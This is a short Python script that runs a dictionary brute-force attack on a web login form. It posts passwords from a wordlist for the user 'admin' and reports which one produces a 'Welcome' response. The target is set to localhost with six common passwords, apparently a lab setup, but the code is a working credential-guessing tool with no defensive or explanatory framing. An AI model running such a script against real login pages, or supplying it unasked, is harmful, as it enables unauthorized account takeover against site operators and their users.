import requests

def brute_force(url, username, wordlist):
    print(f"[*] Starting brute-force on {username} at {url}")
    
    for password in wordlist:
        data = {
            "username": username,
            "password": password
        }
        
        response = requests.post(url, data=data)
        
        if "Welcome" in response.text:
            print(f"\n[+] SUCCESS! Password found: {password}")
            return password
        else:
            print(f"[-] Failed: {password}")
            
    print("\n[-] Attack finished. Password not found in wordlist.")
    return None

if __name__ == "__main__":
    target_url = "http://127.0.0.1:8000"
    target_user = "admin"
    passwords = ["123456", "password", "admin", "letmein", "secret123", "qwerty"]
    
    brute_force(target_url, target_user, passwords)

